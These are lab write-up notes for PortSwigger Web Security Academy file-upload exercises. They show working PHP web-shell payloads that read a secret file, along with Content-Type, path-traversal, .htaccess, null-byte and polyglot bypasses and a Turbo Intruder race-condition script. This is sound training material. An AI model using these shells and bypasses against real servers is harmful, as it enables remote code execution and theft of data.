**Remote code execution via web shell upload**


From <https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload> 


Sign in and upload a random image 
Our request when we 

Our file get request 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f93a4895-ab42-4bde-84b2-4fcee2e44b03)


Our file post request to upload 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6ec652d8-ff3d-4811-8796-48940de1bae4)




Sent post to repeater and delete all the red useless data. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a317ef37-baa4-4da0-a57f-665eb1fa526e)


Trying to upload php shell

```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Rename filename to exploit.php than  send 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/395615d3-0675-4d72-b662-a9e7b5ced9e6)





To fetch the output https://0af1000703855365863231390034002c.web-security-academy.net/files/avatars/exploit.php
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/32c57e09-4cb4-4731-9af2-655123d68f80)


**Web shell upload via Content-Type restriction bypass**

From <https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass> 

Log in and upload a php shell 
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```


Get the following that php is not allowed
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5f431897-8a62-48e9-803f-7118ed6aa78d)

image/jpeg

From <https://0afe001f03c79c2f8097814000330001.web-security-academy.net/my-account/avatar> 


Send that request to repeater
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/125f13d9-ee82-405f-b618-7cd56b3e71e8)

 

Change content type to 
image/jpeg
And send
Shell been uploaded 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7f71c899-da60-4bb8-a1d8-e55e90d51c0a)



Our shell that read the requested file 
https://0afe001f03c79c2f8097814000330001.web-security-academy.net/files/avatars/shell.php
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4abdc5d3-e1ab-4ea9-8900-01f5b403778c)



**Web shell upload via path traversal**

From <https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal> 


Login and upload webshell
Notice that we can't get web shell 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/29b3c8b3-29a7-45d2-85bc-39d17ce2c0bd)


https://0a6300a1030583d682b18e6600070048.web-security-academy.net/files/avatars/shell.php


Go to our upload request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d99fad71-a894-40e4-9e82-3d26dcec0543)






Going up a directory 
https://0a6300a1030583d682b18e6600070048.web-security-academy.net/files/shell.php
Ulrl not found
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/68914408-f4f5-4ef4-af14-ed6a195b0e48)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f7d9a2e9-4c42-4cba-a435-c5c2979660ae)





Url encode our  `../`
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/91668f80-fa2d-4b80-bfb0-f48e15a914b7)





We now got our shell 
SBg03Dg3K1cPNonKO0ctZseZKaDm0VRQ

From <https://0a6300a1030583d682b18e6600070048.web-security-academy.net/files/shell.php> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1c60e316-640a-4c05-be3d-34c17a078a8f)







Web shell upload via extension blacklist bypass

From <https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass> 



Log in and upload a php shell 
We get php not allow 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/49345ca5-36a4-4c63-8499-0798fad992d5)






Response reveal php 2.4.41 
Which we can use .htaccess to make changes to configuration 
• In Burp Repeater, go to the tab for the POST /my-account/avatar request and find the part of the body that relates to your PHP file. Make the following changes: 
	• Change the value of the filename parameter to .htaccess. 
	• Change the value of the Content-Type header to text/plain. 
	• Replace the contents of the file (your PHP payload) with the following Apache directive: 
```
AddType application/x-httpd-php .l33t
``` 
This maps an arbitrary extension (.l33t) to the executable MIME type application/x-httpd-php. As the server uses the mod_php module, it knows how to handle this already. 

From <https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass> 

We have edited the htaccess config to accept php
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a8a5bbfb-fd69-4725-9826-2d35a70b2c2f)



Change shell to 133t on our upload request 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0fc9c240-9433-403b-8f7d-015e218e6c61)





https://0a0e007b038f402a833223b900a700f4.web-security-academy.net/files/avatars/shell.l33t
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/41cbeca3-598e-4be7-9d4f-cebfa6f18910)



**Web shell upload via obfuscated file extension**

From <https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension> 

Login and upload a php exploit 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/176f6fb4-d19e-4985-b78b-0f1f1ae6372b)


We get a message that php not allowed with a 403 forbidden request 


Add a nullbyte double extension 
%00.jpg  

File uploaded 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/cf06c84d-0667-4649-8cdd-b03fdefdbe71)


https://0ac600d504c077e582a4d926006e006a.web-security-academy.net/files/avatars/shell.php

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4ee1a407-59dc-449b-8055-650faeaa8965)





***Remote code execution via polyglot web shell upload***

From <https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload> 


Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata

From <https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload> 

```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" exploit.jpg -o polyglot.php
```

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a69d7cac-fafd-4d45-945d-a5d4ada7af57)



Notice that the mime type is png and the file extension is php 

**Web shell upload via race condition**

From <https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition> 

We cant upload our shell.php using previous technique 
We need to cause a race condition
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/aa6ff3e8-0b8b-4c27-81f0-7fead0cc3a83)

upload a legitimate picture file 

Our exploit for turbo intruder 

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''
POST /my-account/avatar HTTP/1.1
Host: 0a7c00620476fe3b825dfcbb00a9002a.web-security-academy.net
Cookie: session=JR8hIKCJ0qrin7lNitrgbedcBg5MyVF2
Content-Length: 474
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a7c00620476fe3b825dfcbb00a9002a.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryACWvLiXRtNM2gMcS
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7c00620476fe3b825dfcbb00a9002a.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

------WebKitFormBoundaryACWvLiXRtNM2gMcS
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryACWvLiXRtNM2gMcS
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryACWvLiXRtNM2gMcS
Content-Disposition: form-data; name="csrf"

BHUb4MUphcMKkMwrJL3EBc6pvEi4cA3x
------WebKitFormBoundaryACWvLiXRtNM2gMcS--


'''

    request2 = '''
GET /files/avatars/shell.php HTTP/1.1
Host: 0a7c00620476fe3b825dfcbb00a9002a.web-security-academy.net
Cookie: session=JR8hIKCJ0qrin7lNitrgbedcBg5MyVF2
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7c00620476fe3b825dfcbb00a9002a.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i


'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e8d37520-310e-47e8-906f-2460491d3f14)





We can also use repeater by sending request in groups 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/62b1fdcb-cb27-47a1-9e15-69bdaef39f0c)


